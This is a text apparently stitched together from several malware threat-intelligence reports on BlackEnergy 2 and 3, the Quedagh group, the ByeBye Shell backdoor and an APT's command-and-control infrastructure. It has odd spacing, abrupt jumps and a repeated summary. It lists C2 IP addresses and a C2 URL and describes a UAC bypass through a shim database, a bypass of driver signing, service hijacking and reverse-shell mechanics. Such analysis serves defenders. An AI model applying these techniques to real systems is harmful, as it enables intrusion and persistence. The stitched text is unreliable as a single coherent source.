In some of the BE2 configuration files , we can notice an value with a `` gid '' type : This number is an ID for the plus.google.com service and is used by the ' grc ' plugin to parse html .
It then downloads and decrypts a PNG file .
The decrypted PNG is supposed to contain a new CNC address , but we never observed one .
We are aware of two related GooglePlus IDs .
The first one , plus.google.com/115125387226417117030/ , contains an abnormal number of views .
At the time of writing , the count is 75 million : The second one - plus.google.com/116769597454024178039/posts - is currently more modest at a little over 5,000 views .
All of that account 's posts are deleted .
During observation of the described above `` router - PC '' CnC we tracked the following commands delivered in the config file before the server went offline .
Our observation of related actions here : The issued commands for the Linux plugins suggest the attackers controlled infected MIPS / ARM devices .
We want to pay special attention to the DDoS commands meant for these routers .
188.128.123.52 belongs to the Russian Ministry of Defense and 212.175.109.10 belongs to the Turkish Ministry of Interior 's government site .
While many researchers suspect a Russian actor is behind BE2 , judging by their tracked activities and the victim profiles , it 's still unclear whose interests they represent .
While observing some other CnCs and pulling down config files , we stumbled upon some strange mistakes and mis - typing .
They are highlighted in the image below : First , these mistakes suggest that the BE2 attackers manually edit these config files .
Secondly , it shows that even skilled hackers make mistakes .
The contents of the config files themselves are fairly interesting .
They all contain a callback c2 with a hardcoded ip address , some contain timeouts , and some contain the commands listed above .
We include a list of observed hardcoded ip C2 addresses here , along with the address owner and geophysical location of the host : It 's interesting that one of these servers is a Tor exit node .
And , according to the collected config files , the group upgraded their malware communications from plain text http to encrypted https in October 2013 .
BlackEnergy2 victims are widely distributed geographically .
We identified BlackEnergy2 targets and victims in the following countries starting in late 2013 .
There are likely more victims .
Russia Ukraine Poland Lithuania Belarus Azerbaijan Kyrgyzstan Kazakhstan Iran Israel Turkey Libya Kuwait Taiwan Vietnam India Croatia Germany Belgium Sweden Victim profiles point to an expansive interest in ICS : power generation site owners power facilities construction power generation operators large suppliers and manufacturers of heavy power related materials investors However , we also noticed that the target list includes government , property holding , and technology organizations as well : high level government other ICS construction federal land holding agencies municipal offices federal emergency services space and earth measurement and assessment labs national standards body banks high - tech transportation academic research We gained insight into significant BE2 victim profiles over the summer of 2014 .
Interesting BE2 incidents are presented here .
The BE2 attackers successfully spearphished an organization with an exploit for which there is no current CVE , and a metasploit module has been available This email message contained a ZIP archive with EXE file inside that did not appear to be an executable .
This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension .
The attached exe file turned out to be ' BlackEnergy - like ' malware , which researchers already dubbed ' BlackEnergy3 ' - the gang uses it along with BlackEnergy2 .
Kaspersky Lab detects ' BlackEnergy3 ' malware as Backdoor . Win32.Fonten – naming it after its dropped file `` FONTCACHE.DAT '' When investigating computers in the company 's network , only BE2 associated files were found , suggesting BE3 was used as only a first - stage tool on this network .
The config files within BE2 contained the settings of the company 's internal web proxy : As the APT - specific BE2 now stores the downloaded plugins in encrypted files on the system ( not seen in older versions – all plugins were only in - memory ) , the administrators were able to collect BE2 files from the infected machines .
After decrypting these files , we could retrieve plugins launched on infected machines : ps , vsnet , fs , ss , dstr .
By all appearances , the attackers pushed the ' dstr ' module when they understood that they were revealed , and wanted to hide their presence on the machines .
Some machines already launched the plugin , lost their data and became unbootable .
Also , on some machines , documents were encrypted , but no related plugin could be found .
The second organization was hacked via the first victim 's stolen VPN credentials .
After the second organization was notified about the infection they started an internal investigation .
They confirmed that some data was destroyed on their machines , so the BE2 attackers have exhibited some level of destructive activity .
And , they revealed that their Cisco routers with different IOS versions were hacked .
They were n't able to connect to the routers any more by telnet and found the following `` farewell '' tcl scripts in the router 's file system : Ciscoapi.tcl – contains various wrappers over cisco EXEC - commands as described in the comments .
The comment includes a punchy message for `` kasperRsky '' : Killint.tcl – uses Ciscoapi.tcl , implements destroying functions : The script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files .
The organization managed to discover what scripts were hosted on the server before BE / SandWorm gang deleted them , and unfortunately could n't restore them after they were deleted .
The BE2 actor performs careful , professional activity covering their tracks : ciscoapi.tcl killint.tcl telnetapi2.tcl telnetu.tcl stub.tcl stub1.tcl There is evidence that the logs produced by some scripts were also stored on the FTP server , in particular the information on CDP neighbors which is provided by one of the procedures of ciscoapi.tcl .
The third organization got compromised by the same type of attack as the first one ( an EXE file spoofing a doc within a Zip archive ) .
All the plugins discovered in BE2 files were known , and there was no revelation of hacked network devices on their side and no destroyed data .
The noticeable thing is that many computers contained both BE2 and BE3 files and some config files contained the following URL : hxxps : //46.165.222 ( dot ) 28/upgrade / f3395cd54cf857ddf8f2056768ff49ae / getcfg.php The URL contains the md5 of the string ' router ' .
One of the discovered config files contained a URL with an as yet unidentified md5 : hxxps : //46.165.222 ( dot ) 28/upgrade / bf0dac805798cc1f633f19ce8ed6382f / upgrade.php A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy .
Starting in March 2014 and ending in July 2014 , Siemens '' ccprojectmgr.exe '' downloaded and executed a handful of different payloads hosted at 94.185.85.122/favicon.ico .
They are all detected as variants of `` Backdoor . Win32.Blakken '' .
Each config file within BE2 main.dll has a field called build_id which identifies the malware version for the operators .
Currently this particular BE / SandWorm gang uses a certain pattern for the build ids containing three hex numbers and three letters , as follows : 0C0703hji The numbers indicate the date of file creation in the format : Year - Month - Day .
Still , the purpose of the letters is unknown , but most likely it indicates the targets .
The hex numbers were n't used all the time , sometimes we observed decimal numbers : 100914_mg 100929nrT Most interesting for us was the earliest build i d we could find .
Currently it is `` OB020Ad0V '' , meaning that the BE2/SandWorm APT started operating as early as the beginning of 2010 .
While BE dropper installs its driver under a randomly picked non - used Windows driver name , like % system32 % \drivers\AliIde.sys .
The driver is self - signed on 64-bit systems However , new `` APT '' BE2 uses one of the following filenames that are used as an encrypted storage for plugins and the network settings .
TLP : WHITE BlackEnergy is a toolkit that has been used for years by various criminal outfits .
In the summer of 2014 , we noted that certain samples of BlackEnergy malware began targeting Ukranian government organizations for information harvesting .
These samples were identified as being the work of one group , referred to in this document as `` Quedagh '' , which has a history of targeting political organizations .
The Quedagh - related customizations to the BlackEnergy malware include support for proxy servers and use of techniques to bypass User Account Control and driver signing features in 64-bit Windows systems .
While monitoring BlackEnergy samples , we also uncovered a new variant used by this group .
We named this new variant BlackEnergy 3 .
The use of BlackEnergy for a politically - oriented attack is an intriguing convergence of criminal activity and espionage .
As the kit is being used by multiple groups , it provides a greater measure of plausible deniability than is afforded by a custom- made piece of code .
F - SECURE LABS SECURITY RESPONSE Malware Analysis Whitepaper BlackEnergy is a popular crimeware ( that is , malware designed to automate criminal activities ) that is sold in the Russian cyber underground and dates back to as early as 2007 .
Originally , it was designed as a toolkit for creating botnets for use in conducting Distributed Denial of Service ( DDoS ) attacks .
Over time , the malware has evolved to support different plugins , which are used to extend its capabilities to provide necessary functions , depending on the purpose of an attack .
Given the nature of its toolkit , BlackEnergy has unsurprisingly been used by different gangs for different purposes ; some use it for sending spam , others for stealing banking credentials .
The most notorious use may be when it was used to conduct cyberattacks against Georgia during the Russo - Georgian confrontation in 2008 .
In the summer of 2014 , BlackEnergy caught our attention when we noticed that samples of it were now tailored to target Ukrainian government institutions .
Though it may be unrelated , it is interesting to note that this change conveniently coincides with the on - going crisis in that country .
Related or not , one thing is certain : the actor ( s ) using these customized BlackEnergy malware are intent on stealing information from the targets .
The use of this crimeware in what constitutes as an advance persistent threat ( APT ) attack is interesting .
In ' black operations ' ( black ops ) , an important criteria is that the attack should not be attributable - and what provides better plausible deniability than crimeware known to be used by multiple parties ? In this paper we focus only on BlackEnergy samples known to be used specifically by the actors we identify as Quedagh , who seem to have a particular interest in political targets .
Special focus will be on the samples that were used in targeted attacks against Ukrainian government organizations earlier this year .
ATTACK OVERVIEW At the time of writing , we have little information on how exactly victims are receiving the BlackEnergy malware being pushed by the Quedagh gang .
An educated guess is that they are receiving the malware via targeted emails containing malicious attachments .
Meanwhile , the following infection and technical details are based on samples gathered after searching through F - Secure Labs ' collection of all BlackEnergy samples and identifying those with Quedagh characteristics .
The BlackEnergy toolkit comes with a builder application which is used to generate the clients that the attacker ( s ) use to infect victim machines .
The toolkit also comes with server - side scripts , which the attackers set up in the command and control ( C & C ) server .
The scripts also provide an interface where an attacker can control his bots .
The simplicity and convenience provided by the toolkit means that anyone who has access to the kit can build his own botnet without any skills required .
The original BlackEnergy toolkit first emerged in 2007 and is referred to in this paper as BlackEnergy 1 .
A later variant of the toolkit ( BlackEnergy 2 ) was released in 2010 .
We also encountered a previously unseen variant , which had been rewritten and uses a different format for its configuration .
It also no longer uses a driver component .
We dubbed this new variant BlackEnergy 3 .
Most of the recent BlackEnergy installers collected are named msiexec.exe .
We believe they are either dropped by another executable that uses social engineering tricks to mislead the user into executing the installer , or by documents containing exploits that silently perform the installation .
We found at least 2 trojanized legitimate applications that execute the installer ( in addition to their legitimate tasks ) .
Trojanization is an effective infection method , as most users have no way of observing that a malicious component is being installed in tandem with a legitimate program .
Some earlier installer variants , then named regedt32 .
exe , were distributed by documents exploiting software vulnerabilities , one of which was CVE-2010 - 3333 .
These documents drop and execute the installer , then open a decoy document .
It is reasonable to assume that a similar approach has been used to deliver the more recent installer variants .
The installer filename of BlackEnergy 3 is still msiexec.exe .
However , it is delivered and executed by a dropper which opens a decoy document in the foreground .
We also encountered a standalone , non - persistent sample that pretends to be Adobe Flash Player Installer .
It does not use any decoy document or application and does not run after reboot .
The overview below summarizes the various infection vectors used by the Quedagh gang to deliver BlackEnergy crimeware to the designated targets .
From the very earliest variants we were able to attribute to Quedagh , we have noticed that their targets have been political in nature .
Apart from other indicators , we can deduce the nature of the target based on the content of social engineering tactics used to distribute the installers .
For example , one decoy dropped from a sample dating to 2012 ( image 2 ) seems to be targeting European audiences and discusses a political / economic situation .
Strings found in another sample from 2012 ( image 3 ) again indicate a political motivation behind the attack .
Most decoys used content taken from news sites ; we noted one decoy dropped by an exploit document was created using the Russian version of Office ( image 4 ) .
The latest variant of the dropper pretends to be a document file with a Ukrainian filename ( image 5 ) .
The choice of language for the filename again may tie in or reference the current political crisis in that country .
The filename itself means ' password list ' in English .
During our investigation , we found interesting details that lead us to suspect that Quedagh might have been involved in the cyberattacks launched against Georgia during the 2008 Russo - Georgian confrontation .
While the details identified are suggestive , they are not conclusive ; they do however seem consistent with the group 's involvement in subsequent targeted attacks .
While examining the samples collected during our BlackEnergy monitoring , we noticed that samples from this year had been updated to support the use of proxy servers while connecting to their C & C servers .
This contrasts with earlier BlackEnergy 2 variants , which do not support proxy servers .
In some network setups , a proxy server is needed to allow internal users to access the Internet .
BlackEnergy¹s use of a proxy server may indicate that the gang has prior knowledge of the target organization 's internal setup to note of this requirement .
For example , in one sample the configuration uses the proxy server associated with the Ukrainian Railway ( image 6 ) .
The configuration from another sample also shows it using an internal proxy under the giknpc domain ( image 7 ) .
The domain giknpc.com.ua in turn hosts 3 domains ( image 8 ) , one of which is for the city of Dnipropetrovsk ( image 9 ) , the fourth - largest city in Ukraine , located in the southeast .
Based on the set proxy servers for the different samples , we concluded that the gang is targeting Ukrainian government organizations .
Although they may have started much earlier , the earliest BlackEnergy sample we could attribute to the Quedagh gang is from December 14 , 2010 .
Initially , the group seemed to prefer to use the filename of the Windows registry editor ( regedt32.exe ) , presumably because the installer needs administrator rights to install its driver component and therefore would try to request for the highest available rights ( image 10 ) , if possible .
As this triggers a notification message visible to the user , said user is more likely to grant permission if it appears to be the registry editor that is requesting for permission , since it is normal to run it with administrator rights .
Experienced users though are less likely to be taken in , thereby decreasing the likelihood of a successful infection .
Starting April 2013 , modified installers appeared showing that the Quedagh group found a way to bypass the default User Account Control ( UAC ) settings .
With this change , the user 's permission is no longer need ( image 11 ) .
At this point , the gang also began to use the Windows installer program filename msiexec.exe .
Within a month of Windows 8.1 's release , the gang had quickly added support for 64-bit systems , possibly anticipating that more of their target systems will be migrated to 64-bit systems .
They also employ a neat trick to bypass the driver signing requirement on 64- bit Windows systems .
As a side note , this latest finding updates and supercedes previously published research related to BlackEnergy 's driver signing behavior .
However , this trick does n't work on Windows 8 and later systems .
The driver also crashes occassionally .
This could be the reason for the stand - alone non - persistent BlackEnergy variant .
We identified the new BlackEnergy 3 variant first by the change in its configuration , which differed from those of its two predecessors , 1 and 2 ( images 12 to 14 ) .
It also no longer uses a driver component [ 3 ] .
Further technical details are documented on page 10 to 11 .
The malware will only attempt to infect a system if the current user is a member of the local administrator group .
If not , it will re - launch itself as Administrator on Vista .
This in effect will trigger a UAC prompt .
On Windows 7 and later however , the malware will attempt to bypass the default UAC settings .
It exploits a backward - compatibility feature found in newer versions of Windows .
BlackEnergy installers include a Shim Database , or a `` fix '' , instructing SndVol.exe to execute cmd.exe ( image 15 , below ) instead in order to resolve the incompatibility .
SndVol.exe is one of the Windows executables that will be automatically elevated upon execution because it is thought to be safe .
What harm can a volume control cause ? With the malicious `` fix '' installed however , executing SndVol.exe will execute the not - so - safe file cmd.exe instead , which can then be used to install the malware while in an elevated state .
The role of the installer is to set up the malware 's persistent component , which is the driver component .
On 64-bit Windows systems , Microsoft has enforced a policy that requires all drivers to be signed as a security precaution .
Signing provides a way to identify a driver to its author , effectively reducing the number of malware developers willing to take the risk .
To allow developers to test their drivers during development , Microsoft provides a TESTSIGNING boot configuration option ; while in this mode , a watermark is displayed on the screen to make it obvious to users and to prevent malware from exploiting this option .
BlackEnergy enables the TESTSIGNING option to load its driver component ; to hide this change from the user , the malware removes the watermark by removing the relevant strings in the user32.dll.mui of the system .
In Windows 8 and up however , the strings are no longer stored in user32.dll.mui , so the trick will not work .
This may be one of the reasons for the existence of a standalone non- persistent BlackEnergy variant .
The malware does not infect 64-bit Windows systems that are older than Vista .
The installer will try to locate an existing driver service that is inactive .
The service found will usually be a legitimate one that is disabled because it is no longer used or because it is set to start only on demand .
The installer will drop the driver component using the corresponding path of the service .
It will overwrite the existing driver if necessary .
The hijacked service is then set to start automatically .
This is how the malware is able to survive after a reboot .
By doing this , the gang may be hoping that their malicious driver will be overlooked by administrators or investigators who are so used to seeing those legitimate services .
The only component that will remain permanently on the infected system will be the driver component .
The driver component used by the gang is a stripped down version of the BlackEnergy 2 driver .
The sole purpose of this driver component is to inject the main DLL component into svchost.exe .
Interestingly , it does not contain the rootkit functionalities for hiding processes , files and registry objects that is found in the usual BlackEnergy 2 drivers .
The gang may have opted for a ' hide in plain sight ' approach to evade detections from rootkit scanners , such as GMER and RootkitRevealer , that checks for system anomalies .
The driver component provides a IOCTL interface to communicate with the main DLL component .
Table 1 ( above ) summarizes the command codes that can be passed to the IOCTL buffer .
The 32-bit version contains additional , incomplete routines for hiding processes via direct kernel object manipulation ( DKOM ) and managing BlackEnergy 2 rootkit rules in memory .
BlackEnergy 2 was very well documented by Dell SecureWorks [ 5 ] in 2010 .
Table 2 ( above ) summarizes the differences between the driver component used by Quedagh compared to the typical BlackEnergy 2 .
The core functionality of BlackEnergy 2 is found in the main DLL component .
This component is embedded inside the driver component and is not found in the file system ; this is to reduce the infection footprint on the system .
The main DLL provides a robust framework for attackers to maintain a botnet that is not tied to any specific functionality .
The malware is designed to be used by loading customized plugins depending on the purpose of the botmaster .
It is mainly a framework for plugins to communicate with a central command and control .
Otherwise , the main DLL only provides a minimal set of commands .
Table 3 ( above ) summarizes the commands supported by the variants used in the attack against Ukrainian government organizations .
In BlackEnergy 2 , the main DLL component communicates with its plugins via a defined set of API calls .
It exports a number of function calls , which can be used by the plugins .
On the other hand , plugins are required to export 2 functions to work .
We highly recommend the research of Dell SecureWorks for those looking for more details regarding the BlackEnergy 2 plugin framework .
In contrast to previous variants , BlackEnergy 3 uses a simpler installer component .
It does not have a driver component and the installer drops the main DLL component directly to the local application data ( non- roaming ) folder .
The installer then creates a LNK file in the startup folder , using a filename generated based on the volume serial number as a launch point .
The LNK file is a shortcut to execute the main DLL using rundll32.exe .
This variant uses a new configuration format .
The configuration data is a series of X509_ASN encoded values and are accessed by an ID number .
Table 4 summarizes the fields and their equivalent BlackEnergy 2 XML node , while table 5 lists the completely new set of commands used in this latest variant .
BlackEnergy 3 also uses a different method of communication with its plugins , as it now communicates via RPC over the named - pipe protocol ( ncacn_np ) .
Since the main DLL component offers little clue as to what the malware was used for , we need to look at the plugin to determine the objective of the gang .
One particular plugin that was used in the campaign was called `` si '' , perhaps to mean ' steal information ' .
The latest sample we found will attempt to gather the following information and send them to the C & C server : The nature of the information being gathered seems to be generic rather than targeted .
This may be because the malware has roots from crimeware .
The information is still useful however as such data makes it easier for the gang to plan any further attacks on the same targets .
Main DLL process configuration data embedded 1 in its body ; will only process fields related to communication .
BlackEnergy 2 configuration may also contain initial commands to execute .
2 Main DLL reports to C & C .
Main DLL processes the configuration data 3 returned by the C & C .
This time , it processes fields related to plugins and commands .
BlackEnergy communicates with its C & C server via HTTP POST requests .
For the BlackEnergy 2 samples used by the gang , the request contains the following fields : Where : • bot_id is equivalent to the infected host name and the volume serial number following the format x [ host_name ] _ [ serial_no ] ( e.g .
xJOE- PC_484DA98A ) • build_id is the string found in the build_id field in the sample 's configuration data • x , y , z are hardcoded values which varies among samples The fields are almost the same for BlackEnergy 3 samples : The only major difference is that the i d field contain just the hash instead of the actual string .
The actual bot_id string in which the i d hash is derived is also a bit different ; it now uses the format [ domain_sid ] _ [ host_name ] _ [ serial_no ] .
The response of the command and control server will be encrypted using the i d field in the POST request as the key .
After the response is decrypted , it will be in the form of the corresponding configuration data of the BlackEnergy sample ; for example , BlackEnergy 2 samples expect the decrypted response to be a XML document , while BlackEnergy 3 samples expect the decrypted response to be a series X509_ASN encoded values .
The decrypted response , which is equivalent to another configuration data , will be processed similar to the initial configuration data embedded in the main DLL ; the only differences are the data fields that are processed .
This cycle is illustrated in diagram 3 ( above ) .
The main DLL also uses the fields listed in table 6 ( above ) when it needs to download additional files .
BlackEnergy is a toolkit that has been used for years by various criminal outfits .
In the summer of 2014 , we noted that certain samples of BlackEnergy malware began targeting Ukranian government organizations for information harvesting .
These samples were identified as being the work of one group , referred to in this document as `` Quedagh '' , which has a history of targeting political organizations .
Though inconclusive , suggestive details indicate that BlackEnergy malware , possibly also from this gang , may also have been used in the Russo - Georgian confrontation in 2008 .
The Quedagh - customizations to the BlackEnergy malware include support for proxy servers ( which , in the samples examined are associated with Ukrainian entities ) and use of techniques to bypass User Account Control and driver signing features in 64-bit Windows systems .
While monitoring BlackEnergy samples , we also encountered a new variant , which we dub BlackEnergy 3 , with a modified configuration , no driver component and a different installation procedure .
The use of BlackEnergy for a politically - oriented attack is an intriguing convergence of criminal activity and espionage .
As the kit is being used by multiple groups , it provides a greater measure of plausible deniability than is afforded by a custom - made piece of code .
All Places > Information Security > Blog > 2013 > August > 19 Information Security Posted by Claudio Guarnieri in Information Security on Aug 19 , 2013 2:10:45 PM Asia and South Asia are a theater for daily attacks and numerous ongoing espionage campaigns between neighboring countries , so many campaigns that it 's hard to keep count .
Recently I stumbled on yet another one , which appears to have been active since at least the beginning of the year , and seems mostly directed at Pakistani targets .
In this article we 're going to analyze the nature of the attacks , the functionality of the backdoor - here labelled as ByeBye Shell - and the quick interaction I had with the operators behind this campaign .
No exploit was used in any of the attacks we attribute to this campaign - the attackers probably just relied on social engineering the victim through well - crafted spearphishing emails .
The malware first appears to the victim as a .scr
file .
In some cases the attackers make use of the Left - to - Right Override Unicode character in order to twist the .exe
file extension into something more credible .
Once executed it drops and launches a batch script in a % Temp % subfolder with the following content : As you can see , it enforces some configuration in the registry in order to hide file extensions and not show hidden folders .
Subsequently the malware creates and launches a Cabinet Self - Extractor , which drops two additional executable files : one embedding either a PDF or a Microsoft Office Word document , the other being the actual backdoor .
These are the hashes of the original droppers I inspected during this analysis : The embedded documents all show content revolving around internal or foreign Pakistan politics - following are some examples of such documents : Let 's face it : at the point where the attackers obtain control over the target computer , not much sophistication is left in day - to - day targeted attacks .
PoisonIvy , Gh0st and custom backdoors are daily business for threat analysts and malware researchers , in most cases being tedious work with little technical challenge .
This campaign is no exception .
The main backdoor installed and executed on the victims ' systems appears to be a custom reverse shell with just a handful of features .
Due to a lack of public literature about this case , I decided to dub this family as ByeByeShell .
When disassembling the binary you can quickly understand the mechanics of the backdoor .
After some quick initialization , the backdoor XORs an embedded string with 0x9D to extract the IP address of the C & C server .
Subsequently it establishes a connection to it ( generally on port 80 ) and checks in with some basic information about the system .
As you can see , it reports the computer name , the user name , the IP address and MAC address of the network adapter .
The [ P130813 ] line appears to be a constant value , possibly a target identifier .
Interestingly , in a specific malware sample belonging to this campaign , the backdoor also appends the string `` INS and AfPak '' at the end of the message - note that , as defined by Wikipedia , `` AfPak ( or Af - Pak ) is a neologism used within US foreign policy circles to designate Afghanistan and Pakistan as a single theater of operations '' .
After the check - in message is sent , the malware enters a continuous loop in which it will keep silently waiting for commands from the open socket connection .
From now on , it expects some manual interaction from the attacker .
The supported commands are : shell , comd , sleep , quit , kill You can see the switch block in the following screenshots .
In the following screenshot you can see how the reverse shell is implemented : it just launches a cmd.exe and pipes stdin , stdout and stderr to the opened socket so that the operator can directly interact with the Windows prompt .
The samples are also signed with an invalid Microsoft Windows certificate , which can be used for further fingerprinting : In all the cases presented in this blog post , the backdoors tried to connect to the C & C located at 46.165.207.134 , which appears to be a dedicated server hosted by Leaseweb : At the time of writing , the server appears to still be online .
However port 80 , which the backdoors try to contact , appears to be available only sporadically .
In order to get some fun out of an overall straightforward analysis , I quickly hacked together a Python script that emulates a ByeBye backdoor - following is the code : As you can see , this script simply tries to emulate the basic functionality of ByeBye : it performs the initial check - in and waits for incoming messages from the operator .
Yes - since , as previously said , the C & C comes online only at times - I instructed the script to play an extremely loud alarm .
Props to my flatmate for waking me up whenever the alarm went off .
Surprisingly the operator responded few moments later my first attempt , although he quickly tried to terminate me probably noticing an unexpected origin : Unfortunately at that time I did n't have the script completed , therefore he noticed something odd and closed my connection .
I let a few days pass , completed the script and prepared a more credible scenario : a legitimate looking system connecting out of South Asia .
This time it took a bit longer to get some response from the operator , who simply tried to search for documents on the system : Sadly no further activity was observed .
This is yet another case of poorly skilled attackers managing to run successful espionage campaigns for extended periods of time .
This is probably one of the most basic incidents I encountered so far , but we can safely assume that the operators behind this campaign are successful enough to maintain the operations running for at least the last 6 months , possibly even more .
No clear indicator is available to make an informed estimate on what could be the origin of the attacks .
This paper presents the findings of an extensive investigation into command and control infrastructure used by an Advanced Persistent Threat .
Findings include technical details of malicious software , and associated command and control protocols .
These findings are drawn upon to identify modus operandi and demonstrate links between a number of major targeted attacks including the recent Sykipot attacks , the July 2011 SK Communications hack , the March 2011 RSA breach , and the series of coordinated cyber attacks dubbed NightDragon .
This paper discusses malicious activity and identifies Internet Protocol ( IP ) addresses , domain names , and websites that may contain malicious content .
For safety reasons these locations should not be accessed , scanned , probed , or otherwise interacted with unless their trustworthiness can be verified .
On 28 July 2011 SK Communications announced it had been the subject of a hack which resulted in the theft of the personal details of up to 35 million people .
The attackers infected a number of SK Communications computers with malicious software ( malware ) and , by issuing command and control ( C2 ) instructions to the malware , were able to gain access to , and exfiltrate large quantities of data .
The attack itself was complex , well planned and likely part of a broader , concerted hacking effort attributable to an Advanced Persistent Threat .
The malware used in the attack was programmed to communicate with several ' callback ' domains .
The malware located its C2 server ( s ) by resolving these domains into IP addresses using the ubiquitous Domain Name System ( DNS ) protocol .
These communications are depicted in Figure 1 .
One of the callback locations used in the SK Communications hack was ' update.alyac.org ' .
The domain was registered on 24 September 2010 using registration information almost identical to that of a legitimate company – a tactic used by the attacker on several occasions .
Following the intrusion into the SK Communications network it became widely known that the domain was being used for malicious purposes , and perhaps for this reason , the one year registration was not renewed by the attacker .
Despite this , a number of victims around the world continued to use the domain to locate their C2 server , resulting in attempted communications to a C2 server that no longer exists .
Computers using IP addresses allocated to France , the People 's Republic of China , Portugal , South Korea , Taiwan , the United Kingdom and the United States are among those that attempted to communicate with ' alyac.org ' subdomains after the attacker 's registration lapsed in September 2011 .
While some of these computers belong to security researchers who deliberately installed malware for research purposes , most are victims compromised by the attacker either directly or indirectly .
The victims are from a variety of industries including the technology sector , high precision manufacturing , research and development , testing and certification , global market research , executive headhunting and mentoring , and webhosting providers .
Eight different types of C2 communications were observed to ' alyac.org ' subdomains from the compromised computers .
These communication types will be referred to as ' LURK ' , ' X­Shell C601 ' , ' Update ? ' , ' Murcy ' , ' Oscar ' , ' BB ' , ' DB ' , and ' Qdigit ' respectively .
Several victims communicated via both ' Update ? ' and ' Oscar ' which are believed to be associated with the same malware .
No other victims were observed communicating with ' alyac.org ' subdomains via more than one C2 protocol .
A single computer was observed communicating with the callback domain ' path.alyac.org ' on Transmission Control Protocol ( TCP ) 80 via the ' LURK ' protocol .
The communications contained a 15­byte header followed by data compressed using the DEFLATE compression method .
The header contained a protocol identifier , size and compression information as shown in Table 1 .
The decompressed data reveals information about the compromised computer such as its name , computer specifications and operating system ( OS ) information as shown in Table 2 .
For example , it reveals that the compromised computer communicating with ' path.alyac.org ' is running Windows 2003 Server Web Edition , Service Pack 2 .
Similar communications are known to be generated by malware that communicates with the callback domain ' office.windowupdate.org ' – a domain that is linked to ' alyac.org ' not only by the communications protocol but also by both domain registration tactic and infrastructure .
The domain ' windowupdate.org ' is ostensibly registered to ' Microsoft Corporation ' .
The administrative address and contact information listed in the domain registration is identical to that listed for the legitimate Microsoft domain ' windowsupdate.com ' .
This is the same tactic used by the attacker with registration of ' alyac.org ' .
The domain ' windowupdate.org ' previously pointed to South Korean IP address 222.122.20.241­ an IP address to which ' alyac.org ' also previously pointed .
This shared infrastructure further suggests that the observed communications to ' path.alyac.org ' and those to ' office.windowupdate.org ' may be linked to the same attacker .
The malware that generates the LURK communications sent to ' office.windowupdate.org ' was signed using a compromised code signing certificate belonging to YNK Japan Inc – a producer of online games .
The same certificate has been used in a number of attacks including by Hupigon malware and malware similar to that used in the SK Communications hack .
Details of the compromised code signing certificate are shown in Figure 2 .
( Fagerland , 2011 ) The compromised code signing certificate was revoked on 29 July 2011 but , as the malware was signed on 3 July 2010 and the revocation was not active for software signed before 29 July 2011 , the certificate continued to validate for this malware after the revocation .
( Fagerland , 2011 ) The date of effect of the revocation has since been backdated to prevent this malware 's certificate from validating .
The new date of effect still may not prevent the validation of all malware using this compromised code signing certificate .
Numerous compromised computers communicated with ' path.alyac.org ' on TCP port 443 ­a port commonly used for SSL .
These communications , however , were not SSL but instead unencrypted communications likely generated by a version of the command­line based ' X­Shell 601 ' Remote Administration Tool ( RAT ) .
A summary of the observed X­Shell communications , and the information they reveal about the compromised computer , is shown in Table 3 .
The ' C ' immediately preceding the ' 601 ' in the communications is believed to indicate that the malware is not a free version but instead a custom , or commercial , version of the X­Shell 601 RAT .
In all observed communications the process name listed at byte 288 was ' svchost.exe ' .
Based on this , the malware has likely modified the system registry on the compromised computers in such a way that the RAT gets executed as a service by the trusted process ' svchost.exe ' each time the computer is started .
This process name , along with the callback location , is configurable , and can be configured after the RAT has been compiled into executable form .
While X­Shell supports numerous versions of the Windows OS ( including Windows XP , Vista , Windows 7 , and Windows 2000 , 2003 and 2008 server ­ both 32 and 64 bit versions ) , only computers running Windows XP were observed communicating with ' path.alyac.org ' .
The functionality of the RAT depends on the version , release number , plugins installed and the OS on which the RAT is installed .
Several versions of the X­Shell RAT exist , including a free version and a ' spy ' version .
The free version of the RAT is no longer available for download from the XDoors website , however , development of the software continues .
Current release numbers of the X­Shell RAT include 601 and 603 .
Previous releases date back to at least 2006 .
Some functionality comes standard in all versions of the RAT including the ability to start a command shell , control processes and services , upload / download files , terminate TCP connections , create user accounts , retrieve system information , log user activity ( via a keylogger ) , modify timestamps on files , conduct process injection , conduct denial of service attacks and shutdown or restart the computer .
Commands supported by the X­Shell software are listed in Annex C. ( XTiger ) The RAT is Virtual Machine ( VM ) aware , proxy aware and can also use a specified DNS server to resolve callback domains .
Some versions have rootkit functionality and can avoid detection by antivirus software .
Third­party plugins can be developed and integrated into the product .
Optional features include encrypted file search , an SMS notification service , and functionality that enables the compromised computer to be used as part of a botnet to send spam or to conduct distributed denial of service attacks .
This broad range of functionality makes the software fit for a number of purposes and reflects the commercial nature of the software .
( XTiger ) The X­Shell RAT is generated by the X­Shell Control Program ­ the same program from which the malware is controlled .
The control program can be run in either Chinese language mode or English language mode , and allows the malware to be easily configured .
It provides options to digitally sign the malware , specify its connection mode ( connect / listen / sniff ) , install the malware in one of several covert manners , recover the System Service Dispatch Table ( SSDT ) before installation , and abort installation if a virtual machine is detected .
( XTiger ) When X­Shell malware is generated , and the ' connect ' connection mode selected , the malware is configured with a static C2 host ( IP address or callback domain ) and control port .
Additionally , an option can be selected during the generation process to actively notify the malware of a new C2 host and port via a configuration webpage .
If this option is selected , the malware communicates with both a configuration webpage , and a C2 server at regular intervals .
The interval for each can be separately configured to a value of between 30 and 3600 seconds ( inclusive ) .
( XTiger ) The X­Shell RATs that communicated with the C2 host ' path.alyac.org ' had been configured to use a 36 second interval .
It is not known whether the malware was configured solely with a static C2 host or whether the malware also retrieves its C2 host and port from a configuration webpage .
X­Shell configuration webpages contain , in encoded form , a colon­separated IP address ( or callback domain ) and port for the malware to use to communicate with its C2 server .
The encoded IP address ( or callback domain ) and control port can be decoded one byte at a time using the formula : where i is the byte index , di is the decoded byte , ei is the encoded byte and x is a one byte key .
This is the equivalent of subtracting both the key and the byte position number [ 0­7 ] from each byte .
The position number is modulo 8 i.e .
repeats every 8 bytes .
For example , if the compromised computers received a C2 host of ' PATH.ALYAC.ORG ' and a control port of 443 from a configuration webpage , and a key of 0x16 ( 22 in decimal ) was used to encode the control information , the configuration webpage would have contained the encoded string ' fXlaH\hvWZFhlbVQJJ ' .
HyperText Transfer Protocol ( HTTP ) POST ' Update ? ' requests were sent to both ' path.alyac.org ' and ' update.alyac.org ' from compromised computers .
